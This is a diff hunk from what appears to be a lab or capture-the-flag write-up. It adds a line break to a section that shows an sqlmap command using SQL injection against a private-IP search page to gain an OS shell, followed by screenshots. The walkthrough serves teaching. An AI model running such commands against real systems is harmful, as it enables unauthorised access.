@@ -34,6 +34,7 @@ As we observed manually, the admin password is hashed. Therefore, to upload a sh
 `python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --os-shell`
 
 Now, we can get shell and reverse shell with python.
+<br>
 ![sqlmap 2 image](../images/lion/shell2.webp)
 ![sqlmap 3 image](../images/lion/shell3.webp)
 ![sqlmap 4 image](../images/lion/shell4.webp)
